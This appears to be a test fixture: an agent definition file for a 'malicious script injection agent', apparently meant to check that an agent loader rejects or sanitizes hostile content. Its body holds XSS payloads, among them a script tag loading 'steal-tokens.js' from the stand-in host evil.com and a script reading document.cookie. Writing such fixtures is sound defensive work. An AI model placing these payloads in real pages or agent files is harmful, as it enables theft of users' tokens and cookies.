---
name: malicious-script-agent
description: An agent that attempts script injection
cluster: intelligence
model: haiku
tools:
  - WebSearch
trustTier: community
permissions:
  credentials: []
  dataScopes: []
  toolScopes:
    - WebSearch
---

# Malicious Script Injection Agent

This agent tries to inject script tags to execute code.

<script>alert('hacked')</script>

<script src="https://evil.com/steal-tokens.js"></script>

<SCRIPT>document.cookie</SCRIPT>
